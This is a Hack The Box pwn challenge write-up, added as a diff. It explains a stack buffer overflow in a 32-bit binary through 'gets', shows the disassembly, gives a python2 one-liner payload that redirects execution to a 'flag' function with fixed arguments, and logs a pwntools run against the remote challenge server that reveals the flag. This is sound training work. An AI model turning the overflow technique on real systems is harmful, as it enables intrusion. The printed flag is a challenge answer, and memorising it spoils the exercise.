@@ -1,1 +1,70 @@
+HACK THE BOX ROOM VULN in PWN CHALLENGES 
 
+This is a 32 bit binary with no security controls enabled on it
+
+┌──(kali㉿kali)-[~/hackthebox]
+└─$ checksec vuln
+[*] '/home/kali/hackthebox/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+    
+    I used Ghidra and pwndbg to debug this
+    
+    when the code is disassembled using GHIDRA, we could see Vuln function has "gets" that is vulnerable to buffer overflow vulnerability.
+    
+    we could see function called flag which is a deadcode in the binary that prints the flag information
+    
+    We just need to craft the payload in such a way that the return pointer gets overwritten by the address of the "flag" function
+    
+    As the buffer size is 184 bytes + 4 bytes of ebp to overwrite and the flag has the address "0x080491e2" , we will be able to overwrite the return pointer with the 
+    address of the flag function.
+    
+    As ASLR is turned off , we can hardcode the address of the flag function into the payload , that made things even easier
+    
+    But on Analysing the disassembled code of flag function , we could see that the paramters passed to flag should have "$0xdeadbeef" and "$0xc0ded00d" to print the 
+    flag to the output
+    
+     0x0804923e <+92>:    call   0x8049050 <fgets@plt>
+   0x08049243 <+97>:    add    $0x10,%esp
+   0x08049246 <+100>:   cmpl   $0xdeadbeef,0x8(%ebp)
+   0x0804924d <+107>:   jne    0x8049269 <flag+135>
+   0x0804924f <+109>:   cmpl   $0xc0ded00d,0xc(%ebp)
+   0x08049256 <+116>:   jne    0x804926c <flag+138>
+   0x08049258 <+118>:   sub    $0xc,%esp
+   0x0804925b <+121>:   lea    -0x4c(%ebp),%eax
+   0x0804925e <+124>:   push   %eax
+   0x0804925f <+125>:   call   0x8049030 <printf@plt>
+   0x08049264 <+130>:   add    $0x10,%esp
+    
+    So , I have crafted a payload in python2 as follows
+    
+    python2 -c "print('A'*188 + '\xe2\x91\x04\x08' + 'B'*4 + '\xef\xbe\xad\xde'+'\x0d\xd0\xde\xc0')")
+    
+    and the flag is printed to the screen
+    
+    A pwntools script in python3 is provided for the same 
+    
+    ┌──(kali㉿kali)-[~/hackthebox]
+└─$ ./vuln.py REMOTE 134.122.101.249 31505
+[*] '/home/kali/hackthebox/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process '/home/kali/hackthebox/vuln': pid 99785
+[+] Opening connection to 134.122.101.249 on port 31505: Done
+HTB{0ur_Buff3r_1s_not_healthy}
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
